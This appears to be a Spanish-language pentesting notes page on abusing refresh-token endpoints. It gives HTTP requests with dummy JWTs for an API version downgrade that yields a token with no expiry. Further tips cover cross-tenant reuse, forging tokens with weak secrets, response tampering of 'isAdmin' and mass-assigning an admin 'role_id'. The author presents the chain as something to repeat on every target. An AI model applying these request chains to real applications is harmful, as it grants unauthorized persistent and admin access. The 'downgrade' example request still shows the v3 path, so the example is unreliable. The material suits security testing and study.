---
title: Refresh Token 
sidebar_position: 1
---

## ¿Lo has visto?

Muchas aplicaciones usan endpoints tipo `/refreshToken` para mantener una sesión viva, pero si te dijiese que puedes aprovecharte de esta cosa para mantener tu sesión viva para siempre.

Me explico un JWT o cualquier token debería tener un limite de vida en su sesión por temas de seguridad, ejemplo si ese token sufre un disclosure o algo similar, y alguien lo puede reutilizar tendría persistencia en la aplicación por siempre (o hasta la fecha em la que muera el token).

## ¿Cómo tomar ventaja?

Primero, ve:

- Cuando caduca el token
- Si puedes reutilizar ese token
- Analiza cómo se refresca

Ejemplo:

Esto lo explote yo mero en un app; Viaja una petición algo así:

```http
POST /middleware/v3/refreshToken HTTP/2
Host: pagina.web
Content-Type: application/json


{"refresh_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxNTE2MzE5OTk3fQ.ogFU_aUsE1WOpP1Z7DlyuPqZLfYkFeNapHMfW87f9yc"}
```

Y el response da algo:

```http
200 OK


{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxNTE2MzE5OTk5fQ.0rQ314RhVbLHYoBmisPUKfgybWWW61z-ijyzZ3Lypiw"}
```

> Si decodeas este JWT dummy en jwt.io puedes ver que el exp dice 18 de enero del 2018 que caduca un día despues del 17 de enero que fue emitido. (No te fijes en el año es un ejemplo puede ser 2026 2027 lo que quiero ve veas es el tiempo de vida de ese token).

Pero... ¿y si hacemos un API version downgrade? o sea en lugar de v3 usa v2.

```http
POST /middleware/v3/refreshToken HTTP/2
Host: pagina.web
Content-Type: application/json


{"refresh_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxNTE2MzE5OTk3fQ.ogFU_aUsE1WOpP1Z7DlyuPqZLfYkFeNapHMfW87f9yc"}
```

El response da esto:

```http
200 OK


{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0.KMUFsIDTnFmyG3nMiGM6H9FNFUROf3wh7SmqJp-QV30"}
```

Ahora si decodeas el nuevo token de la respuesta puedes ver que no tiene un exp :). Prueba ese token generado por esa versión ahora para ver si te puedes autenticar, si funciona pum ya tienes una sesión infinita.

### ¿Por qué?
Pues si haces un bucle generando multiples token en n cantidad de tiempo puedes tener acceso a las funcionalidades con tu token sin expiración.

> Ojo en este ejemplo no le puse exp, en el app que explote caduacaba de que en 4 meses el token entonces pues ajá es cuestión de que veas.


## Final tips

- Ve si puedes usar ese token en cross-tenant(entre otras aplicaciones del cliente).
- Ve si puedes manipular el nuevo token por un secreto pedorro que hayan dejado ahí.
- Ve la fucking respuesta del refresh chance y va un `isAdmin:false` y si usas el match and replace puede que valide esa respuesta (nunca se sabe).
- No solo la respuesta chance y hay un mass-assignment:

```
POST /refreshToken HTTP/2
Host: pagina.web
Content-Type: application/json


{"refresh_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxNTE2MzE5OTk3fQ.ogFU_aUsE1WOpP1Z7DlyuPqZLfYkFeNapHMfW87f9yc","role_id":"un_rol_id_de_admin"}
```

> Si te das cuenta es una cadena de vulnerabilidades, haz lo mismo aquí y siempre. (Downgrade version + Refresh token usage + Privilege escalation + Using in cross-tenant apps).